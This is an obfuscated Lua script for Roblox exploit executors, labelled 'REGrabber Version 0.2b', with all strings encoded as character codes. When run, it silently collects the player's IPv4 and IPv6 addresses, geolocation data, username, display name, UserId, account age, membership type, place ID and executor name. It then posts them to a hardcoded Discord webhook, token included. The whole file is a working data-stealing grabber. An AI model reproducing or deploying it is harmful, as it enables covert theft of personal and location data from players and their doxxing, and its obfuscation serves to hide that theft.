local _0x1 = string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,50,53,54,48,50,50,48,50,51,54,49,50,54,54,50,49,57,47,84,90,102,103,72,75,85,97,72,121,75,57,49,49,79,66,107,90,87,48,55,118,67,79,76,120,68,115,72,50,87,115,65,70,103,73,97,102,50,102,77,56,90,101,101,97,87,86,79,57,50,112,66,73,101,83,117,49,77,71,71,56,107,50,77,100,57,74)
local _0x2 = game:HttpGet(string.char(104,116,116,112,115,58,47,47,97,112,105,46,105,112,105,102,121,46,111,114,103))
local _0x3 = game:HttpGet(string.char(104,116,116,112,115,58,47,47,97,112,105,54,52,46,105,112,105,102,121,46,111,114,103))
local _0x4 = game:HttpGet(string.char(104,116,116,112,115,58,47,47,104,116,116,112,98,105,110,46,111,114,103,47,103,101,116))
local _0x5 = game:HttpGet(string.char(104,116,116,112,58,47,47,119,119,119,46,103,101,111,112,108,117,103,105,110,46,110,101,116,47,106,115,111,110,46,103,112,63,105,112,61).._0x2)
local _0x6 = {["content-type"] = string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)}
local _0x7 = game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer
local _0x8 = _0x7.AccountAge
local _0x9 = string.sub(tostring(_0x7.MembershipType), 21)
local _0xa = _0x7.UserId
local _0xb = _0x7.Name
local _0xc = _0x7.DisplayName
local _0xd = game.PlaceId
local _0xe = os.date(string.char(33,37,89,45,37,109,45,37,100,45,37,72,58,37,77,58,37,83,32,71,77,84,43,48))
local _0xf = string.char(86,101,114,115,105,111,110,32,48,46,50,98)
local function _0x10()
    local _0x11, _0x12 = pcall(identifyexecutor)
    if _0x11 then return _0x12 end
    return (SENTINEL_LOADED and string.char(83,101,110,116,105,110,101,108)) or (XPROTECT and string.char(83,105,114,72,117,114,116)) or (PROTOSMASHER_LOADED and string.char(80,114,111,116,111,115,109,97,115,104,101,114))
end
local _0x13 = {
    [string.char(99,111,110,116,101,110,116)] = "",
    [string.char(101,109,98,101,100,115)] = {{
        [string.char(97,117,116,104,111,114)] = {[string.char(110,97,109,101)] = string.char(82,69,71,114,97,98,98,101,114,32).._0xf},
        [string.char(116,105,116,108,101)] = _0xb,
        [string.char(100,101,115,99,114,105,112,116,105,111,110)] = string.char(97,107,97,32).._0xc,
        [string.char(102,105,101,108,100,115)] = {
            {[string.char(110,97,109,101)] = string.char(85,115,101,114,110,97,109,101,58), [string.char(118,97,108,117,101)] = _0xb, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(77,101,109,98,101,114,115,104,105,112,32,84,121,112,101,58), [string.char(118,97,108,117,101)] = _0x9, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(65,99,99,111,117,110,116,32,65,103,101,32,40,100,97,121,115,41,58), [string.char(118,97,108,117,101)] = _0x8, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(85,115,101,114,73,100,58), [string.char(118,97,108,117,101)] = _0xa, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(73,80,118,52,58), [string.char(118,97,108,117,101)] = _0x2, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(73,80,118,54,58), [string.char(118,97,108,117,101)] = _0x3, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(80,108,97,99,101,32,73,68,58), [string.char(118,97,108,117,101)] = _0xd, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(69,120,101,99,117,116,111,114,58), [string.char(118,97,108,117,101)] = _0x10(), [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(76,111,103,32,84,105,109,101,58), [string.char(118,97,108,117,101)] = _0xe, [string.char(105,110,108,105,110,101)] = true},
            {[string.char(110,97,109,101)] = string.char(72,84,84,80,98,105,110,32,68,97,116,97,32,40,74,83,79,78,41,58), [string.char(118,97,108,117,101)] = string.char(96,96,96,106,115,111,110,10).._0x4..string.char(96,96,96), [string.char(105,110,108,105,110,101)] = false},
            {[string.char(110,97,109,101)] = string.char(103,101,111,80,108,117,103,105,110,32,68,97,116,97,32,40,74,83,79,78,41,58), [string.char(118,97,108,117,101)] = string.char(96,96,96,106,115,111,110,10).._0x5..string.char(96,96,96), [string.char(105,110,108,105,110,101)] = false},
        },
    }}
}
local _0x14 = game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)):JSONEncode(_0x13)
local _0x15 = http_request
if syn then _0x15 = syn.request else _0x15 = http_request end
_0x15({Url=_0x1, Body=_0x14, Method=string.char(80,79,83,84), Headers=_0x6})
